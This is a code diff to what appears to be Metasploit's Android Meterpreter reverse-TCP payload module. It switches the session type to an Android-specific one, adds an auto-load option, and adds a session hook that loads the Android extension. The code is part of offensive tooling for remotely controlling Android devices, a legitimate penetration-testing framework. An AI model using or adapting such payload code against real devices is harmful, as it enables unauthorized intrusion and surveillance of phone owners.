@@ -8,7 +8,7 @@
 require 'msf/core'
 require 'msf/core/payload/dalvik'
 require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/meterpreter_java'
+require 'msf/base/sessions/meterpreter_android'
 require 'msf/base/sessions/meterpreter_options'
 
 
@@ -24,12 +24,19 @@ module Metasploit3
 			'Description'	=> 'Run a meterpreter server on Android',
 			'Author'		=> [
 					'mihi', # all the hard work
-					'egypt' # msf integration
+					'egypt', # msf integration
+					'anwarelmakrahy' #android extension integration
 				],
 			'Platform'		=> 'android',
 			'Arch'			=> ARCH_DALVIK,
 			'License'		=> MSF_LICENSE,
-			'Session'		=> Msf::Sessions::Meterpreter_Java_Java))
+			'Session'		=> Msf::Sessions::Meterpreter_Java_Android))
+
+		register_options(
+		[
+			OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
+		], self.class)
+		
 	end
 
 	#
@@ -48,4 +55,14 @@ module Metasploit3
 		# it from, and then finally the meterpreter stage
 		java_string(clazz) + java_string(metstage) + java_string(met)
 	end
+	
+	def on_session(session)
+		super
+		framework.sessions.schedule Proc.new {
+			session.init_ui(self.user_input, self.user_output)
+			if (datastore['AutoLoadAndroid'] == true)
+				session.load_android
+			end
+		}
+	end	
 end
